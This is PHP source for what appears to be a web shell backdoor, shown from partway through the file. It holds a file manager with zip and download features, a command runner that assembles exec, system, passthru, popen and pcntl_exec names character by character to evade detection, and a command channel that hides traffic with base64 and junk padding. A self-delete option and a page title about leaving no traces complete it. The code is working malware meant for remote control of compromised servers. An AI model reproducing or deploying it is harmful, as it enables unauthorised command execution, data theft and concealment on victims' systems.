        $file_type_list = array('pdf', 'xlsx', 'docx', 'exe', 'mp3', 'mp4', 'avi', 'wav', 'dll', 'zip', 'rar', 'xls', '7z', 'gz');

        while (($FileList = readdir($handler)) !== false) {

            if ($FileList != "." && $FileList != "..") {

                $FilePath = $tols->ToUTF8($tols->ToUTF8($path) . "/" . $tols->ToUTF8($FileList));


                if (is_dir($FilePath)) {
                    $this->add_File_To_Zip($FilePath, $zip);
                } else {


                    $FileInfo = pathinfo($FileList);


                    $FileName = $tols->ToUTF8($FileInfo['basename']);


                    $path = $tols->ToUTF8($path);


                    if ($FileName == basename($zip->filename)) {
                        continue;
                    }

                    if (in_array($FileInfo['extension'], $file_type_list)) {
                        continue;
                    }


                    $FileSize =  0;


                    $FileSize = @filesize($path . "/" . $FileName);


                    if ($FileSize >= 52428800 || $FileSize <= 0) {
                        continue;
                    }


                    $FilePath = $path . "/" . $FileName;


                    $zip->addfile($FilePath);
                }
            }
        }
    }
}

function ZIP($path, $type)
{
    global $tols;
    global $file;

    $path = $tols->DeCoding($path);

    switch ($type) {

        case 'en':


            if ($_SESSION['zip'] == $path) {
                echo $tols->alert_location("Packaging has started, no need to click repeatedly!", $_SERVER['HTTP_REFERER']);
            }

            set_time_limit(0);

            ini_set("max_execution_time", "0");

            ini_set("memory_limit", -1);

            if (!function_exists('zip_open')) {
                setcookie("msg", '"The server does not support PHP_ ZIP components,Please confirm');
                die;
            }


            $EnZipPath = $path;

            $FilePathinfo = pathinfo($EnZipPath);

            $zip = new ZipArchive();

            $_SESSION['zip'] = $path;


            if (!is_dir($EnZipPath)) {

                $ZIP_Path = $EnZipPath . '.zip';

                if ($zip->open($ZIP_Path, ZipArchive::CREATE)) {

                    $zip->addFile($EnZipPath);
                }

                $zip->close();
                setcookie("msg", $FilePathinfo['basename'] . 'File TozIPion succeeded!');
            } else {

                $ZIP_Path = $tols->Replace_Str(getcwd() . '\\' . $FilePathinfo['filename'] . '.zip');

                if ($zip->open($ZIP_Path, ZipArchive::CREATE)) {

                    $file->add_File_To_Zip($EnZipPath, $zip, $FilePathinfo['filename'] . '.zip');
                }
                session_destroy();
                setcookie("msg", $ZIP_Path . 'Directory Tozipion succeeded!');
                $zip->close();
            }
            break;
        case 'de':

            if (!function_exists('zip_open')) {
                $_COOKIE['msg'] =  "The server does not support PHP_ ZIP components,Please confirm";
                die;
            }

            $FilePathinfo = pathinfo($path);

            if (!is_file($path)) {
                $_COOKIE['msg'] =  $FilePathinfo['basename'] . "File does not exist! Please check whether this file exists in the current directory.";
                die;
            }

            $zip = new ZipArchive();


            $rs = $zip->open($path);


            if ($rs !== TRUE) {
                $_COOKIE['msg'] =  $FilePathinfo['basename'] . 'DeTozipion failed! The file does not appear to be a ZIP file.';
                die;
            }

            $zip->extractTo($FilePathinfo['dirname']);

            $zip->close();

            setcookie("msg", $FilePathinfo['basename'] . 'DeTozipion succeeded!');

            break;
    }
    $tols->location();
}

function Exec_Run($c)
{
    global $OsType;
    global $tols;
    global $str_1;
    $res = '';
    $func = $tols->SStr('e') . $tols->SStr('x') . $tols->SStr('e') . $tols->SStr('c');
    if ($tols->FunisDisable($func)) {
        $out = array();
        if (function_exists($func)) {
            $func($c, $out);
            $Newout = "";
            foreach ($out as $k => $v) {
                $Newout .= $v . PHP_EOL;
            }
            return $Newout . PHP_EOL;
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }
    $func = $tols->SStr('s') . $tols->SStr('h') . $tols->SStr('e') . $tols->SStr('l') . $tols->SStr('l') . '_' . $tols->SStr('e') . $tols->SStr('x') . $tols->SStr('e') . $tols->SStr('c');

    if ($tols->FunisDisable($func)) {
        if (function_exists($func)) {
            return $func($c);
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }

    $func = $tols->SStr('s') . $tols->SStr('y') . $tols->SStr('s') . $tols->SStr('t') . $tols->SStr('e') . $tols->SStr('m');


    if ($tols->FunisDisable($func)) {
        if (function_exists($func)) {
            ob_start();
            $func($c);
            $res = ob_get_contents();
            ob_end_clean();
            return $res;
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }


    $func = $tols->SStr('p') . $tols->SStr('a') . $tols->SStr('s') . $tols->SStr('s') . $tols->SStr('t') . $tols->SStr('h') . $tols->SStr('r') . $tols->SStr('u');


    if ($tols->FunisDisable($func)) {
        if (function_exists($func)) {
            ob_start();
            $func($c);
            $res = ob_get_contents();
            ob_end_clean();
            return $res;
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }

    $func = $tols->SStr('p') . $tols->SStr('o') . $tols->SStr('p') . $tols->SStr('e') . $tols->SStr('n');


    if ($tols->FunisDisable($func)) {
        if (function_exists($func)) {
            $f = $func($c, "r");
            if (is_resource($f)) {
                $res = '';
                while (!feof($f)) {
                    $res .= fread($f, 1024);
                }
                pclose($f);
                return $res;
            }
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }

    $func = $tols->SStr('p') . $tols->SStr('c') . $tols->SStr('n') . $tols->SStr('t') . $tols->SStr('l') . '_' . $tols->SStr('e') . $tols->SStr('x') . $tols->SStr('e') . $tols->SStr('c');

    if ($tols->FunisDisable($func)) {
        if (function_exists($func)) {

            $Random_cmd_sh = rand(1, 1000);

            $Random_Cmd_res = rand(1, 1000);

            if ($OsType == $str_1) {

                $TempPath = $tols->SStr('C') . $tols->SStr(':') . $tols->SStr('/') . $str_1 . $tols->SStr('/') . $tols->SStr('T') . $tols->SStr('e') . $tols->SStr('m') . $tols->SStr('p') . $tols->SStr('/');

                $Cmd_To_sh = $TempPath . $Random_cmd_sh . ".bat";

                $Cmd_res_file = $TempPath . $Random_Cmd_res . ".txt";

                file_put_contents($Cmd_To_sh, $c . ' >> ' . $Cmd_res_file);

                $func("C:/" . $str_1 . "//system32//" . $tols->SStr('c') . $tols->SStr('m') . $tols->SStr('d') . ".exe", array($Cmd_To_sh));

                $res = file_get_contents($Cmd_res_file);

                unlink($Cmd_To_sh);

                unlink($Cmd_res_file);
            } else {

                $Cmd_To_sh = "./$Random_cmd_sh.sh";

                $Cmd_res_file = "./$Random_Cmd_res.txt";

                file_put_contents($Cmd_To_sh, $c . ' >> ' . $Cmd_res_file);

                $func($tols->SStr('/') . $tols->SStr('b') . $tols->SStr('i') . $tols->SStr('n') . $tols->SStr('/') . $tols->SStr('b') . $tols->SStr('a') . $tols->SStr('s') . $tols->SStr('h'), array($Cmd_To_sh));

                $res = file_get_contents($Cmd_res_file);

                unlink($Cmd_To_sh);

                unlink($Cmd_res_file);
            }
            return $res;
        } else {
            $res .= "$func this function does not exist!\n";
        }
    } else {
        $res .= "$func Disabled!\n";
    }
    return $res;
}

function Exec_g()
{
    global $Method;
    global $tols;
    global $ScriptLocation;
    $res = '';
    $c = 'dir';
    switch ($Method) {
        case 'POST':
            $c = trim($_POST['c']);
            $keyList = array("A0031", "K6941", "N1111", "M2222", "T3333", "P4004");

            foreach ($keyList as $v) {
                $c = str_replace($v, "", $c);
            }
            $res = base64_encode(Exec_Run(base64_decode($c)));
            $New_Result = '';
            for ($i = 0; $i < strlen($res); $i++) {
                $New_Result .= $res[$i] . $keyList[array_rand($keyList)];
            }
            echo $New_Result;
            break;
        case 'GET':
            echo '
            
            <center>
                <form method="POST" method="#">
                    <div class="actall">Command parameters: <br><br>
                        <textarea name="c" id="c" style="width:850px;height:100px;">' . $c . '</textarea>
                        <br>
                        <br>
                    </div>
                </form>
                <input type="submit" onclick="return EnText();" value="implement" style="width:80px;height:40px;">
                </center>
                <br>
                <div class="actall">
                    <textarea id="show" style="width:850px;height:399px;"></textarea>
                </div>
                <script language="javascript">
                    function EnText(){
                        var key = ["A0031","K6941","N1111","M2222","T3333","P4004"];
                        var c = btoa(document.getElementById("c").value);
                        var NewStr = "";
                        for(i=0;i < c.length;i++){
                            NewStr += c[i] + key[Math.floor((Math.random()*5)+1)];
                        }
                        var xhr = null;
                        try { xhr = new XMLHttpRequest() } catch (e) { xhr = new ActiceXObject(' . "'" . 'Microsoft.XMLHttp' . "'" . ') };
                        xhr.open("post", "' . $ScriptLocation . '?s=g&_="+(new Date().getTime()), true);
                        xhr.setRequestHeader(' . "'" . 'Content-type' . "'" . ', ' . "'" . 'application/x-www-form-urlencoded' . "'" . ');
                        xhr.onreadystatechange=function () {
                            console.log(xhr.readyState);
                            if(xhr.readyState==4 && xhr.status == 200){
                                var respText =  xhr.responseText;
                                respText = respText.replace(/A0031/g,"").replace(/K6941/g,"").replace(/N1111/g,"").replace(/M2222/g,"").replace(/T3333/g,"").replace(/P4004/g,"");
                                document.getElementById("show").value = atob(respText);
                            }
                        }
                        xhr.send("c="+NewStr);
                    }
                </script>
                ';
            break;
        default:

            break;
    }
}


function Root_CSS()
{
    echo '  <style type="text/css">
            *{padding:0; margin:0;}
                body{background:threedface;font-family:"Verdana","Tahoma","Song typeface",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
                a{color:#000000;text-decoration:none;}
                a:hover{background:#BBBBBB;}
                table{color:#000000;font-family:"Verdana","Tahoma","Song typeface",sans-serif;font-size:13px;border:1px solid #999999;}
                td{background:#F9F6F4;}
                .toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}
                .msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
                .actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
                .footer{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:1050px;color:#000000;background: #888888;}
            </style>' . "\n";
}


function WinMain()
{
    global $tols;

    $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);

    $Server_OS = PHP_OS;

    $Php_Version = PHP_VERSION;

    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];

    echo '<html>
				<head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
					<title>
						I think I should leave something, but I am afraid that it will reveal my traces. So I decided not to stay.
					</title>
				</head>
				<body>
					<style type="text/css">
					*{padding:0; margin:0;}
							body{background:#AAAAAA;font-family:"Verdana", "Tahoma","Song typeface",sans-serif;font-size:13px;text-align:center;margin-top:5px;word-break:break-all;}
							a{color:#FFFFFF;text-decoration:none;}
							a:hover{background:#BBBBBB;}
							.outtable{margin: 0 auto;height:800px;width: 1145px;px;color:#000000;border-top-width: 2px;border-right-width:2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
							.topbg{padding-top:3px;font-size:12px;text-align:left;font-weight:bold;height:22px;color:#FFFFFF;background:#293F5F;}
							.listbg{font-family:"lucida grande",tahoma,helvetica,arial,"bitstream vera sans",sans-serif;font-size:13px;width:130px;}
							.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
							.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
							.footer{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:20px;width:1050px;color:#000000;background: #888888;}
					</style>

					<script language="JavaScript" type="text/javascript">
						function switchTab(tabid){
                            for(var i = 0; i <= 2 ; i++) {
								if(tabid == "t_" + i) {
									document.getElementById(tabid).style.background="#FFFFFF";
								} else {
                                    document.getElementById("t_" + i).style.background="#BBBBBB";
                                }
							}
						}
                        function DelSelf(){
                            smsg = "Are you sure you want to delete yourself?";

                            if(confirm(smsg))
                            {
                                window.location = "?s=k";
                            }
                        }
                        function RestatKey(){
                            window.location = "?s=r";
                            window.reload();
                        }
					</script>

					<div class="outtable">
						<div class="topbg">
							<center>Current IP  ' . $Server_IP . ' | Current system  ' . $Server_OS . ' | Container Version  ' . $Server_Soft . ' | PHP version  ' . $Php_Version . '</center>
						</div>
						<div style="height:546px;">
							<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td width="140" align="center" valign="top">

										<ul class="listbg">
											<li>
												<a href="?s=a" id="t_0" onclick="switchTab(' . "'" . 't_0' . "'" . ')" target="main">FileManager</a>
											</li>
											<li>
												<a href="?s=g" id="t_1" onclick="switchTab(' . "'" . 't_1' . "'" . ')" target="main">ExecuteCommand</a>
											</li>
                                            <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
											<li>
												<a href="Javascript:void(0)" onclick="DelSelf();" target="main">EDestroy</a>
											</li>
                                            <li>
												<a href="?s=h" id="t_2" onclick="RestatKey();" target="main">ResetKey</a>
											</li>
										</ul>
									</td>
									<td>
										<iframe name="main" src="?s=a" width="90%" height="100%" frameborder="0" style="height: 774px;"></iframe>
									</td>
								</tr>
							</table>
						</div>
					</div>
				</body>
		</html>';
    return false;
}

$s = !empty($_GET['s']) ? $tols->DeCoding($_GET['s']) : Root_CSS();

$p = isset($_GET['p']) ? $tols->DeCoding($_GET['p']) : $tols->Replace_Str(dirname(__FILE__));

switch ($s) {
    case "a":
        $file->File_a($p);
        break;
    case "d":
        $file->File_Down($tols->DeCoding($_GET['p']));
        break;
    case "e":
        $file->File_Edit($_GET['p'], $_GET['n'], $_GET['t']);
        break;
    case "g":
        Exec_g();
        break;
    case "z":
        ZIP($_GET['p'], $_GET['t']);
        break;
    case 'k':
        unlink($_SERVER['SCRIPT_FILENAME']);
        break;
    case 'r':
        $keys_Path = '';
        if ($OsType == $str_1) {
            $keys_Path = $str_4;
        } else {
            $keys_Path = $str_5;
        }
        unlink($keys_Path);
        header("Location: " . $_SERVER['PHP_SELF']);
        break;
    default:
        WinMain();
        break;
}